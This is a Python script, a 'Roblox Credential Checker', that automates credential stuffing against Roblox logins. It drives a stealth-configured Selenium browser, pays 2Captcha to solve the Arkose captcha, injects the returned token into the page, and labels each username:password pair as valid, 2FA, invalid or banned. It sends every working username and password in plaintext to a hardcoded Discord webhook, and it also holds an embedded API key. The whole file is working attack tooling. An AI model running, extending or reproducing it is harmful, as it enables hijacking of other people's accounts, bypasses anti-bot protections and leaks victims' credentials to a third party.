#!/usr/bin/env python3
"""
Roblox Credential Checker v6.2 - FIXED CAPTCHA DETECTION
Waits for captcha to fully load before analyzing result
"""

import sys
import time
import random
import argparse
import requests
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from colorama import init, Fore, Style

init(autoreset=True)

# ==================== CONFIG ====================
CAPTCHA_API_KEY = "bbccd6ff53cb8f27b76b651106009661"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1500536718376567006/ru7gaSarmlNRWVpa1eWEb09geLzEQz-z0BxuqThG9SsZP-C9v_-YnpP4kUmnSit-A41x"

MIN_DELAY = 10
MAX_DELAY = 15

TWOCAPTCHA_IN_URL = "http://2captcha.com/in.php"
TWOCAPTCHA_RES_URL = "http://2captcha.com/res.php"


# ==================== CAPTCHA SOLVER ====================
class TwoCaptchaSolver:
    def __init__(self, api_key):
        self.api_key = api_key

    def solve_funcaptcha(self, publickey, surl, pageurl):
        print(f"{Fore.YELLOW}[*] Submitting captcha to 2Captcha (voice method)...{Style.RESET_ALL}")

        payload = {
            "key": self.api_key,
            "method": "funcaptcha",
            "publickey": publickey,
            "surl": surl,
            "pageurl": pageurl,
            "json": 1,
            "voice": 1,
            "soft_id": 0
        }

        try:
            response = requests.post(TWOCAPTCHA_IN_URL, data=payload, timeout=30)
            result = response.json()

            if result.get("status") == 1:
                captcha_id = result.get("request")
                print(f"{Fore.YELLOW}[*] Captcha ID: {captcha_id}{Style.RESET_ALL}")
                return self._get_result(captcha_id)
            else:
                error = result.get("request", "Unknown error")
                print(f"{Fore.RED}[-] 2Captcha error: {error}{Style.RESET_ALL}")
                return None

        except Exception as e:
            print(f"{Fore.RED}[-] 2Captcha submit error: {str(e)}{Style.RESET_ALL}")
            return None

    def _get_result(self, captcha_id, max_wait=180, check_interval=5):
        print(f"{Fore.YELLOW}[*] Waiting for captcha solution...{Style.RESET_ALL}")

        start_time = time.time()
        while time.time() - start_time < max_wait:
            try:
                response = requests.get(
                    f"{TWOCAPTCHA_RES_URL}?key={self.api_key}&action=get&id={captcha_id}&json=1",
                    timeout=30
                )
                result = response.json()

                if result.get("status") == 1:
                    token = result.get("request")
                    print(f"{Fore.GREEN}[+] Captcha solved!{Style.RESET_ALL}")
                    return token

                if result.get("request") == "CAPCHA_NOT_READY":
                    elapsed = int(time.time() - start_time)
                    print(f"{Fore.YELLOW}[*] Still solving... ({elapsed}s){Style.RESET_ALL}", end="\r")
                    time.sleep(check_interval)
                    continue
                else:
                    error = result.get("request", "Unknown")
                    print(f"{Fore.RED}[-] 2Captcha error: {error}{Style.RESET_ALL}")
                    return None

            except Exception as e:
                time.sleep(check_interval)

        print(f"{Fore.RED}[-] Captcha solving timeout{Style.RESET_ALL}")
        return None


# ==================== CHROME OPTIONS ====================
def get_chrome_options():
    options = Options()

    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)

    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    ]
    options.add_argument(f'--user-agent={random.choice(user_agents)}')

    return options


# ==================== ROBLOX CHECKER ====================
class RobloxChecker:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.driver = None
        self.result = {
            'username': username,
            'password': password,
            'status': 'UNKNOWN',
            'details': '',
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.captcha_solver = TwoCaptchaSolver(CAPTCHA_API_KEY)

    def setup_driver(self):
        try:
            print(f"{Fore.CYAN}[*] Starting browser...{Style.RESET_ALL}")
            options = get_chrome_options()

            self.driver = webdriver.Chrome(options=options)
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(15)

            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

            return True
        except Exception as e:
            self.result['status'] = 'ERROR'
            self.result['details'] = f'Driver: {str(e)}'
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            return False

    def check_credentials(self):
        if not self.setup_driver():
            return self.result

        try:
            print(f"{Fore.CYAN}[*] Checking: {self.username}{Style.RESET_ALL}")

            print(f"{Fore.CYAN}[*] Loading login page...{Style.RESET_ALL}")
            self.driver.get("https://www.roblox.com/login")

            time.sleep(random.uniform(5, 7))

            current_url = self.driver.current_url
            print(f"{Fore.CYAN}[*] URL: {current_url}{Style.RESET_ALL}")

            if '/login' not in current_url:
                self.result['status'] = 'ERROR'
                self.result['details'] = 'Not on login page'
                print(f"{Fore.RED}[-] Not on login{Style.RESET_ALL}")
                return self.result

            self._handle_popups()
            self._fill_login_form()
            self._submit_and_analyze()

        except Exception as e:
            self.result['status'] = 'ERROR'
            self.result['details'] = str(e)
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        finally:
            self._cleanup()

        return self.result

    def _handle_popups(self):
        try:
            time.sleep(0.5)
            buttons = self.driver.find_elements(By.XPATH,
                "//button[contains(text(), 'Accept') or contains(text(), 'Allow')]")
            for btn in buttons[:1]:
                try:
                    self.driver.execute_script("arguments[0].click();", btn)
                    time.sleep(0.3)
                except:
                    pass
        except:
            pass

    def _fill_login_form(self):
        try:
            wait = WebDriverWait(self.driver, 20)

            print(f"{Fore.CYAN}[*] Finding fields...{Style.RESET_ALL}")

            username_field = wait.until(EC.presence_of_element_located((
                By.XPATH,
                "//input[@id='login-username' or @name='username' or contains(@placeholder, 'Username')]"
            )))

            self._human_type(username_field, self.username)
            time.sleep(random.uniform(0.8, 1.5))

            password_field = wait.until(EC.presence_of_element_located((
                By.XPATH,
                "//input[@id='login-password' or @name='password' or @type='password']"
            )))

            self._human_type(password_field, self.password)
            time.sleep(random.uniform(0.8, 1.5))

            print(f"{Fore.CYAN}[*] Fields filled{Style.RESET_ALL}")

        except Exception as e:
            raise Exception(f"Fill form: {str(e)}")

    def _human_type(self, element, text):
        try:
            element.clear()
        except:
            pass

        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.12))

    def _wait_for_page_stable(self, max_wait=15):
        """Wait for page to fully load and stabilize"""
        print(f"{Fore.CYAN}[*] Waiting for page to stabilize...{Style.RESET_ALL}")

        start = time.time()
        last_url = self.driver.current_url
        last_source = self.driver.page_source
        stable_count = 0

        while time.time() - start < max_wait:
            time.sleep(1.5)

            current_url = self.driver.current_url
            current_source = self.driver.page_source

            # Check if URL or page content changed significantly
            if current_url == last_url and len(current_source) == len(last_source):
                stable_count += 1
                if stable_count >= 2:  # Stable for 2 consecutive checks
                    print(f"{Fore.CYAN}[*] Page stable after {int(time.time()-start)}s{Style.RESET_ALL}")
                    return True
            else:
                stable_count = 0
                last_url = current_url
                last_source = current_source
                print(f"{Fore.YELLOW}[*] Page still loading...{Style.RESET_ALL}", end="\r")

        print(f"{Fore.YELLOW}[*] Wait timeout, proceeding anyway{Style.RESET_ALL}")
        return False

    def _is_captcha_present(self):
        """Check if captcha is ACTUALLY present on page"""
        page_source = self.driver.page_source.lower()

        # Check for captcha iframe/elements
        captcha_elements = self.driver.find_elements(By.XPATH,
            "//iframe[contains(@src, 'arkose') or contains(@src, 'funcaptcha') or contains(@src, 'captcha')]"
        )
        captcha_elements += self.driver.find_elements(By.XPATH,
            "//div[contains(@id, 'captcha') or contains(@class, 'captcha') or contains(@class, 'arkose')]"
        )
        captcha_elements += self.driver.find_elements(By.XPATH,
            "//div[contains(@id, 'FunCaptcha') or contains(@class, 'FunCaptcha')]"
        )

        # Check text indicators
        text_indicators = [
            'captcha', 'arkose', 'funcaptcha', 'challenge', 
            'verification required', 'prove you are human',
            'security check', 'please verify'
        ]
        has_text = any(indicator in page_source for indicator in text_indicators)

        return len(captcha_elements) > 0 or has_text

    def _is_loading_spinner_present(self):
        """Check if page is still loading"""
        loading_indicators = [
            "//div[contains(@class, 'spinner') or contains(@class, 'loading') or contains(@class, 'loader')]",
            "//div[contains(@id, 'loading') or contains(@id, 'spinner')]",
            "//img[contains(@src, 'loading') or contains(@src, 'spinner')]",
            "//svg[contains(@class, 'spinner') or contains(@class, 'loading')]"
        ]

        for xpath in loading_indicators:
            elements = self.driver.find_elements(By.XPATH, xpath)
            if elements:
                return True
        return False

    def _extract_captcha_data(self):
        try:
            page_source = self.driver.page_source

            publickey = "B7D8911C-5CC8-A9A3-35B0-554ACEE604DA"  # Default Roblox key
            surl = "https://client-api.arkoselabs.com"

            import re
            scripts = self.driver.find_elements(By.TAG_NAME, "script")
            for script in scripts:
                try:
                    text = script.get_attribute("innerHTML") or ""
                    pk_match = re.search(r"""["']?publickey["']?\s*[:=]\s*["']([A-F0-9-]+)["']""", text, re.I)
                    if pk_match:
                        publickey = pk_match.group(1)

                    surl_match = re.search(r"""["']?surl["']?\s*[:=]\s*["'](https?://[^"']+)["']""", text, re.I)
                    if surl_match:
                        surl = surl_match.group(1)
                except:
                    pass

            return {
                "publickey": publickey,
                "surl": surl,
                "pageurl": "https://www.roblox.com/login"
            }
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting captcha data: {str(e)}{Style.RESET_ALL}")
            return None

    def _solve_captcha_with_voice(self):
        print(f"{Fore.YELLOW}[!] Captcha detected! Switching to voice solving...{Style.RESET_ALL}")

        try:
            # Click audio/voice button
            audio_buttons = self.driver.find_elements(By.XPATH,
                "//button[contains(@aria-label, 'audio') or contains(@aria-label, 'Audio') or "
                "contains(text(), 'Audio') or contains(text(), 'audio') or "
                "contains(@class, 'audio') or contains(@class, 'voice')]"
            )

            for btn in audio_buttons:
                try:
                    self.driver.execute_script("arguments[0].click();", btn)
                    print(f"{Fore.YELLOW}[*] Clicked audio/voice button{Style.RESET_ALL}")
                    time.sleep(2)
                    break
                except:
                    pass

            alt_buttons = self.driver.find_elements(By.XPATH,
                "//*[contains(text(), 'Audio Challenge') or contains(text(), 'audio challenge') or "
                "contains(text(), 'Listen') or contains(text(), 'listen')]"
            )
            for btn in alt_buttons:
                try:
                    self.driver.execute_script("arguments[0].click();", btn)
                    time.sleep(2)
                    break
                except:
                    pass

            captcha_data = self._extract_captcha_data()
            if not captcha_data:
                print(f"{Fore.RED}[-] Could not extract captcha data{Style.RESET_ALL}")
                return False

            print(f"{Fore.YELLOW}[*] Captcha PK: {captcha_data['publickey']}{Style.RESET_ALL}")

            token = self.captcha_solver.solve_funcaptcha(
                publickey=captcha_data["publickey"],
                surl=captcha_data["surl"],
                pageurl=captcha_data["pageurl"]
            )

            if not token:
                print(f"{Fore.RED}[-] Failed to solve captcha{Style.RESET_ALL}")
                return False

            print(f"{Fore.YELLOW}[*] Injecting captcha token...{Style.RESET_ALL}")

            injection_scripts = [
                f"""
                var callback = window.___grecaptcha_cfg || window.funCaptchaCallback || function(){{}};
                if (typeof callback === 'function') callback('{token}');

                var inputs = document.querySelectorAll('input[name*="captcha"], input[name*="token"], input[type="hidden"]');
                for (var i = 0; i < inputs.length; i++) {{
                    if (inputs[i].name.includes('captcha') || inputs[i].name.includes('token') || 
                        inputs[i].id.includes('captcha') || inputs[i].id.includes('token')) {{
                        inputs[i].value = '{token}';
                        inputs[i].dispatchEvent(new Event('input', {{ bubbles: true }}));
                        inputs[i].dispatchEvent(new Event('change', {{ bubbles: true }}));
                    }}
                }}

                if (window.funCaptchaCallback) window.funCaptchaCallback('{token}');
                if (window.arkoseCallback) window.arkoseCallback('{token}');
                """,
                f"""
                window.fcToken = '{token}';
                window.arkoseToken = '{token}';
                document.cookie = 'fc-token=' + '{token}' + '; path=/';
                """
            ]

            for script in injection_scripts:
                try:
                    self.driver.execute_script(script)
                    time.sleep(1)
                except:
                    pass

            verify_buttons = self.driver.find_elements(By.XPATH,
                "//button[contains(text(), 'Verify') or contains(text(), 'verify') or "
                "contains(text(), 'Submit') or contains(text(), 'submit') or "
                "contains(@id, 'verify') or contains(@class, 'verify')]"
            )
            for btn in verify_buttons:
                try:
                    self.driver.execute_script("arguments[0].click();", btn)
                    time.sleep(2)
                except:
                    pass

            time.sleep(5)

            if not self._is_captcha_present():
                print(f"{Fore.GREEN}[+] Captcha solved successfully!{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.YELLOW}[!] Captcha still present, may need retry{Style.RESET_ALL}")
                return False

        except Exception as e:
            print(f"{Fore.RED}[-] Captcha solving error: {str(e)}{Style.RESET_ALL}")
            return False

    def _submit_and_analyze(self):
        try:
            print(f"{Fore.CYAN}[*] Submitting...{Style.RESET_ALL}")

            submit_btn = self.driver.find_element(By.XPATH,
                "//button[@id='login-button' or contains(text(), 'Log In') or contains(text(), 'Sign in')]")

            self.driver.execute_script("arguments[0].click();", submit_btn)

            # ===== CRITICAL FIX: Wait for page to fully load =====
            print(f"{Fore.CYAN}[*] Waiting for response...{Style.RESET_ALL}")

            # Initial wait for page to start changing
            time.sleep(3)

            # Wait for loading spinners to disappear
            spinner_wait = 0
            while self._is_loading_spinner_present() and spinner_wait < 10:
                print(f"{Fore.YELLOW}[*] Page loading...{Style.RESET_ALL}", end="\r")
                time.sleep(1)
                spinner_wait += 1

            # Wait for page to stabilize (URL and content stop changing)
            self._wait_for_page_stable(max_wait=15)

            # Additional wait if captcha might be loading
            time.sleep(2)

            # Now analyze the fully loaded page
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()

            print(f"{Fore.CYAN}[*] Response - URL: {current_url}{Style.RESET_ALL}")

            # Check for captcha FIRST before anything else
            if self._is_captcha_present():
                print(f"{Fore.YELLOW}[!] CAPTCHA detected for: {self.username}{Style.RESET_ALL}")

                # Wait a bit more for captcha to fully render
                time.sleep(3)

                captcha_solved = self._solve_captcha_with_voice()

                if captcha_solved:
                    # Re-analyze after captcha solve
                    time.sleep(3)
                    self._wait_for_page_stable(max_wait=10)

                    current_url = self.driver.current_url
                    page_source = self.driver.page_source.lower()

                    # Check results after captcha
                    if any(x in current_url for x in ['/home', '/games', '/discover', '/robux']):
                        self.result['status'] = 'VALID'
                        self.result['details'] = 'Success (after captcha)'
                        self._send_discord()
                        print(f"{Fore.GREEN}[+] VALID: {self.username}{Style.RESET_ALL}")
                        return

                    if any(x in page_source for x in ['two-step', '2step', 'passkey', 'verification', 'authenticator']):
                        self.result['status'] = 'VALID_2FA'
                        self.result['details'] = '2FA (after captcha)'
                        self._send_discord()
                        print(f"{Fore.GREEN}[+] VALID (2FA): {self.username}{Style.RESET_ALL}")
                        return

                    if any(x in page_source for x in ['incorrect', 'invalid', 'wrong password']):
                        self.result['status'] = 'INVALID'
                        self.result['details'] = 'Invalid (after captcha)'
                        print(f"{Fore.RED}[-] INVALID: {self.username}{Style.RESET_ALL}")
                        return

                    if '/login' in current_url:
                        self.result['status'] = 'INVALID'
                        self.result['details'] = 'Still on login (after captcha)'
                        print(f"{Fore.RED}[-] INVALID: {self.username}{Style.RESET_ALL}")
                        return
                else:
                    self.result['status'] = 'CAPTCHA'
                    self.result['details'] = 'Captcha (failed to solve)'
                    print(f"{Fore.YELLOW}[!] CAPTCHA: {self.username} (unsolved){Style.RESET_ALL}")
                    return

            # SUCCESS
            if any(x in current_url for x in ['/home', '/games', '/discover', '/robux']):
                self.result['status'] = 'VALID'
                self.result['details'] = 'Success'
                self._send_discord()
                print(f"{Fore.GREEN}[+] VALID: {self.username}{Style.RESET_ALL}")
                return

            # 2FA
            if any(x in page_source for x in ['two-step', '2step', 'passkey', 'verification', 'authenticator']):
                self.result['status'] = 'VALID_2FA'
                self.result['details'] = '2FA'
                self._send_discord()
                print(f"{Fore.GREEN}[+] VALID (2FA): {self.username}{Style.RESET_ALL}")
                return

            # INVALID
            if any(x in page_source for x in ['incorrect', 'invalid', 'wrong password']):
                self.result['status'] = 'INVALID'
                self.result['details'] = 'Invalid'
                print(f"{Fore.RED}[-] INVALID: {self.username}{Style.RESET_ALL}")
                return

            # BANNED
            if any(x in page_source for x in ['suspended', 'banned']):
                self.result['status'] = 'BANNED'
                self.result['details'] = 'Banned'
                print(f"{Fore.MAGENTA}[!] BANNED: {self.username}{Style.RESET_ALL}")
                return

            # STILL ON LOGIN
            if '/login' in current_url:
                self.result['status'] = 'INVALID'
                self.result['details'] = 'Still on login'
                print(f"{Fore.RED}[-] INVALID: {self.username}{Style.RESET_ALL}")
                return

            self.result['status'] = 'UNKNOWN'
            print(f"{Fore.CYAN}[?] UNKNOWN: {self.username}{Style.RESET_ALL}")

        except Exception as e:
            self.result['status'] = 'ERROR'
            self.result['details'] = str(e)
            print(f"{Fore.RED}[-] ERROR: {str(e)}{Style.RESET_ALL}")

    def _send_discord(self):
        if not DISCORD_WEBHOOK:
            return
        try:
            payload = {
                'embeds': [{
                    'title': 'Valid Roblox Account',
                    'color': 0x00ff00,
                    'fields': [
                        {'name': 'Username', 'value': self.username, 'inline': True},
                        {'name': 'Password', 'value': f'||{self.password}||', 'inline': True},
                    ]
                }]
            }
            requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        except:
            pass

    def _cleanup(self):
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass


def print_banner():
    banner = f"""
{Fore.CYAN}============================================================
           Roblox Credential Checker v6.2
         FIXED CAPTCHA DETECTION + 2Captcha Voice
============================================================{Style.RESET_ALL}
"""
    print(banner)


def load_credentials(filepath):
    credentials = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split(':')
                if len(parts) >= 2:
                    username = parts[0].strip()
                    password = ':'.join(parts[1:]).strip()
                    if username and password:
                        credentials.append((username, password))
    except FileNotFoundError:
        print(f"{Fore.RED}[-] File not found{Style.RESET_ALL}")
        sys.exit(1)

    return credentials


def save_results(results, output_file='results.txt'):
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write('='*60 + '\n')
        f.write('Roblox Checker Results\n')
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write('='*60 + '\n\n')

        by_status = {}
        for r in results:
            status = r['status']
            by_status.setdefault(status, []).append(r)

        for status in ['VALID', 'VALID_2FA', 'INVALID', 'CAPTCHA', 'BANNED', 'ERROR']:
            if status in by_status:
                f.write(f"\n[{status}] - {len(by_status[status])}\n")
                f.write('-'*40 + '\n')
                for item in by_status[status]:
                    f.write(f"Username: {item['username']}\n")
                    f.write(f"Password: {item['password']}\n\n")

    print(f"{Fore.CYAN}[*] Saved: {output_file}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description='Roblox Checker v6.2 - Fixed Captcha Detection')
    parser.add_argument('file', help='Credentials file')
    parser.add_argument('-o', '--output', default='results.txt')
    parser.add_argument('-d', '--min-delay', type=float, default=MIN_DELAY)
    parser.add_argument('-D', '--max-delay', type=float, default=MAX_DELAY)

    args = parser.parse_args()

    if CAPTCHA_API_KEY == "YOUR_2CAPTCHA_API_KEY_HERE":
        print(f"{Fore.RED}[-] ERROR: Please set your 2Captcha API key!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Edit: CAPTCHA_API_KEY = 'your_key_here'{Style.RESET_ALL}")
        sys.exit(1)

    print_banner()
    print(f"{Fore.CYAN}[*] Proxy: DISABLED{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] 2Captcha: ENABLED (Voice method){Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Delay: {args.min_delay}-{args.max_delay}s\n{Style.RESET_ALL}")

    credentials = load_credentials(args.file)
    if not credentials:
        print(f"{Fore.RED}[-] No credentials!{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}[*] Loaded {len(credentials)} credentials\n{Style.RESET_ALL}")

    results = []

    for i, (username, password) in enumerate(credentials, 1):
        try:
            checker = RobloxChecker(username, password)
            result = checker.check_credentials()
            results.append(result)
        except KeyboardInterrupt:
            break

        if i < len(credentials):
            delay = random.uniform(args.min_delay, args.max_delay)
            print(f"{Fore.YELLOW}[*] Wait {delay:.1f}s\n{Style.RESET_ALL}")
            time.sleep(delay)

    print(f"\n{Fore.CYAN}Results:{Style.RESET_ALL}\n")

    status_counts = {}
    for r in results:
        status_counts[r['status']] = status_counts.get(r['status'], 0) + 1

    for status, count in sorted(status_counts.items()):
        color = {'VALID': Fore.GREEN, 'VALID_2FA': Fore.GREEN, 'INVALID': Fore.RED, 
                 'CAPTCHA': Fore.YELLOW, 'BANNED': Fore.MAGENTA, 'ERROR': Fore.RED}.get(status, Fore.CYAN)
        print(f"{color}    {status}: {count}{Style.RESET_ALL}")

    save_results(results, args.output)
    print(f"\n{Fore.GREEN}[+] Done!{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
